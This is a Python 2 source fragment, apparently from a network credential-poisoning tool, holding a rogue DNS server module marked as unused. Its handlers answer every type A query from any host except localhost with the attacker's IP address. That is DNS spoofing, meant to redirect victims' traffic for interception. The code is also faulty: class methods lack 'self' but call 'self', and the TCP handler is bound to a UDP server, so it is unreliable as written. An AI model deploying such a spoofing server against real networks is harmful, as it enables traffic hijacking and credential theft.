##################################################################################
#DNS Stuff starts here(not Used)
##################################################################################

#Function name self-explanatory

class DNSServer():

	def serve_thread_udp(host, port, handler):
		try:
			server = ThreadingUDPServer((host, port), handler)
			server.serve_forever()
		except Exception, e:
			print "Error starting UDP server on port %s: %s:" % (str(port),str(e))

	def start(DNS_On_Off):
		if DNS_On_Off == "ON":
			t1 = threading.Thread(name="DNS", target=self.serve_thread_udp, args=("0.0.0.0", 53,DNS))
			t2 = threading.Thread(name="DNSTCP", target=self.serve_thread_udp, args=("0.0.0.0", 53,DNSTCP))
			for t in [t1, t2]:
				t.setDaemon(True)
				t.start()

		if DNS_On_Off == "OFF":
			return False

class ThreadingUDPServer(ThreadingMixIn, UDPServer):

	allow_reuse_address = 1

	def server_bind(self):
		UDPServer.server_bind(self)

def ParseDNSType(data):
	QueryTypeClass = data[len(data)-4:]
	if QueryTypeClass == "\x00\x01\x00\x01":#If Type A, Class IN, then answer.
		return True
	else:
		return False

#DNS Answer packet.
class DNSAns(Packet):
	fields = OrderedDict([
		("Tid",              ""),
		("Flags",            "\x80\x10"),
		("Question",         "\x00\x01"),
		("AnswerRRS",        "\x00\x01"),
		("AuthorityRRS",     "\x00\x00"),
		("AdditionalRRS",    "\x00\x00"),
		("QuestionName",     ""),
		("QuestionNameNull", "\x00"),
		("Type",             "\x00\x01"),
		("Class",            "\x00\x01"),
		("AnswerPointer",    "\xc0\x0c"),
		("Type1",            "\x00\x01"),
		("Class1",           "\x00\x01"),
		("TTL",              "\x00\x00\x00\x1e"), #30 secs, dont mess with their cache for too long..
		("IPLen",            "\x00\x04"),
		("IP",               "\x00\x00\x00\x00"),
	])

	def calculate(self,data):
		self.fields["Tid"] = data[0:2]
		self.fields["QuestionName"] = ''.join(data[12:].split('\x00')[:1])
		self.fields["IP"] = inet_aton(OURIP)
		self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))

# DNS Server class.
class DNS(BaseRequestHandler):

	def handle(self):
		data, soc = self.request
		if self.client_address[0] == "127.0.0.1":
			pass
		elif ParseDNSType(data):
			buff = DNSAns()
			buff.calculate(data)
			soc.sendto(str(buff), self.client_address)
			#print "DNS Answer sent to: %s "%(self.client_address[0])
			responder_logger.info('DNS Answer sent to: %s'%(self.client_address[0]))

class DNSTCP(BaseRequestHandler):

	def handle(self):
		try:
			data = self.request.recv(1024)
			if self.client_address[0] == "127.0.0.1":
				pass
			elif ParseDNSType(data):
				buff = DNSAns()
				buff.calculate(data)
				self.request.send(str(buff))
				#print "DNS Answer sent to: %s "%(self.client_address[0])
				responder_logger.info('DNS Answer sent to: %s'%(self.client_address[0]))

		except Exception:
			pass

##################################################################################
#DNS Stuff ends here (not Used) 
##################################################################################